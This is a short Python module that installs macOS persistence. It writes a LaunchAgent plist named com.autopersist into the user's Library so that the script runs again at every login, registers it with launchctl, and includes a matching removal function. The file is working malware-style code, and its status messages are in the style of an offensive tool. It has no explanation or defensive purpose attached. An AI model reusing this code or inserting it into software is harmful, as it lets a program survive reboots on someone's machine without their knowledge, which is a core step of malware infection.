import os

PLIST_PATH = os.path.expanduser("~/Library/LaunchAgents/com.autopersist.plist")
PLIST_CONTENT = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.autopersist</string>
    <key>ProgramArguments</key>
    <array>
        <string>python3</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""

def install(verbose=False):
    try:
        with open(PLIST_PATH, "w") as f:
            f.write(PLIST_CONTENT)
        os.system(f"launchctl load {PLIST_PATH}")
        if verbose:
            print("[+] Persistence installed via LaunchAgent.")
    except Exception as e:
        if verbose:
            print(f"[!] Failed to install persistence: {e}")

def remove(verbose=False):
    try:
        os.system(f"launchctl unload {PLIST_PATH}")
        if os.path.exists(PLIST_PATH):
            os.remove(PLIST_PATH)
        if verbose:
            print("[+] Persistence removed from LaunchAgent.")
    except Exception as e:
        if verbose:
            print(f"[!] Failed to remove persistence: {e}")
